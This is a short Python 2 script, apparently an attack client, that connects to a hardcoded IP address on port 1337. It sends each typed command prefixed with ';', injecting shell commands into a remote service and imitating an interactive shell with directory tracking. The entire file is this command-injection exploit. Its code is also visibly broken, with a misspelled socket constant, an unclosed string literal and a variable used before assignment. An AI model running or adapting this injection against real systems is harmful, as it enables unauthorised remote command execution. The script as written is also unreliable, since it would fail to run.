 import socket
 import fileinput
 import sys

 host = "157.230.179.99"
 port = 1337

 direc = ''

 def execute_cmd(cmd):
	 s = socket.socket(socket.AF_INET, socket. SOCK_STERAM)
	 s.connect((host,port))
	
	 data = s.recv(2048)
	 
	 s.send(cmd + '\n')
	 data = s.recv(2048)
	 print(data)
	 s.close()
	
 if __name__ == '__main__':
	 d = ''
	 q = ''
	 cding = ''
	 inter = ''
	 count = 0
	 s = raw_input('> ')
	 if ( s == "shell"):
	 	while s != "quit" and s != "exit:
			if(count == 0):
		  		s =raw_input('/> ')
				
			else:
				s = raw_input(inter + '> ')
			d = s
			
			if count != 0:
				cding = direct + ';' + s
				
				
			change = d.split(' ')
			if (change[0] == "cd"):
			 	count += 1
				cding = cding + d
				direct = cding
				inter = change[1]
			if (s != "quit" and s != "exit"):
				if count == 0:
					print(d)
					execute_cmd(';' + d)
				else:
					execute_cmd(';' + cding)